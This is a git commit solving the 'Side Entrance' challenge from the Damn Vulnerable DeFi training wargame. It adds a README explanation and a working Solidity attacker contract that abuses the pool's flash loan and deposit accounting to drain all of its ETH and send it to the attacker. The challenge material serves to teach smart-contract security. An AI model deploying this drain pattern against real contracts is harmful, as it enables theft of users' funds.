be2479989452ecc0a47998d927f6dff139ea0252
Patrick Zimmerer <p.zimmerer@east-young.de>
2023-03-19 15:54:21 +0100

    Side Entrance solved + Documentation

--- day10-12/SideEntrance/README.md
+++ day10-12/SideEntrance/README.md
@@ -10,12 +10,43 @@
 
 ### Solution
 
-- Placeholder
+- The vulnerability lies in the `flashLoan()` function which calls an external contract and calls the execute function.
+- At first we need to deposit 1k ETH to the pool as the player. Through a malicious implementation of the execute function we can now perform a reentrancy attack and deposit the loaned tokens so we pass the if check + the balance of the player gets increased by the amount we passed into the `flashLoan()` function, we then only need to withdraw our balance which sould be 2k now (1k deposited + 1k deposited tokens which came from the flashLoan)
 
 ### Attacker Contract
 
 ```solidity
 contract Hack {
+    SideEntranceLenderPool targetContract;
+    address owner = msg.sender;
 
+    constructor(address _targetContract) {
+        targetContract = SideEntranceLenderPool(_targetContract);
+    }
+
+    function attack(uint256 amount) external payable {
+        // 1000 ether => 1000000000000000000000
+        targetContract.flashLoan(amount);
+    }
+
+    function deposit(uint256 amount) external payable {
+        targetContract.deposit{value: amount}();
+    }
+
+    function withdraw() external payable {
+        targetContract.withdraw();
+    }
+
+    function execute() external payable {
+        // reentrancy through this function deposit 1000 ether
+        targetContract.deposit{value: 1000000000000000000000}();
+    }
+
+    function withdrawStolenFunds() external {
+        // since we did perform a reentrancy
+        payable(owner).transfer(address(this).balance);
+    }
+
+    receive() external payable {}
 }
 ```
--- day10-12/SideEntrance/contracts/SideEntrance.sol
+++ day10-12/SideEntrance/contracts/SideEntrance.sol
@@ -8,11 +8,15 @@ interface IFlashLoanEtherReceiver {
     function execute() external payable;
 }
 
-/**
- * @title SideEntranceLenderPool
- * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
- */
 contract SideEntranceLenderPool {
+    // variables added by me to check isComplete in Remix //
+    // Business logic is not being changed //
+
+    address public player;
+    uint256 public playerInitialBalance;
+    uint256 ETH_IN_POOL = 1000 ether;
+
+    // Original contract
     mapping(address => uint256) private balances;
 
     error RepayFailed();
@@ -20,6 +24,32 @@ contract SideEntranceLenderPool {
     event Deposit(address indexed who, uint256 amount);
     event Withdraw(address indexed who, uint256 amount);
 
+    // constructor added by me to check isComplete in Remix
+    // Business logic is not being changed
+    constructor(address _player) {
+        player = _player;
+        playerInitialBalance = player.balance;
+    }
+
+    // function added by me to check isComplete in Remix
+    // Business logic is not being changed //
+    function isComplete() public view returns (bool) {
+        uint256 poolBalance = address(this).balance;
+        uint256 playerBalance = player.balance;
+        uint256 diff;
+        if (playerBalance > playerInitialBalance) {
+            diff = playerBalance - playerInitialBalance;
+        }
+        // checks if balance of player increased by atleast 999 ETH. (-1 to account for gas cost that may be paid)
+        // also checks if pool is drained
+        if (diff > ETH_IN_POOL - 1 && poolBalance == 0) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    // original contract
     function deposit() external payable {
         unchecked {
             balances[msg.sender] += msg.value;
@@ -38,9 +68,36 @@ contract SideEntranceLenderPool {
 
     function flashLoan(uint256 amount) external {
         uint256 balanceBefore = address(this).balance;
-
         IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
 
         if (address(this).balance < balanceBefore) revert RepayFailed();
+    }
+}
+
+contract Hack {
+    SideEntranceLenderPool targetContract;
+    address owner = msg.sender;
+
+    constructor(address _targetContract) {
+        targetContract = SideEntranceLenderPool(_targetContract);
+    }
+
+    function attack(uint256 amount) external payable {
+        // 1000 ether => 1000000000000000000000
+        targetContract.flashLoan(amount);
+        targetContract.withdraw();
+    }
+
+    function deposit(uint256 amount) external payable {
+        targetContract.deposit{value: amount}();
+    }
+
+    function execute() external payable {
+        // reentrancy through this function deposit 1000 ether
+        targetContract.deposit{value: 1000000000000000000000}();
+    }
+
+    receive() external payable {
+        payable(owner).transfer(address(this).balance);
     }
 }
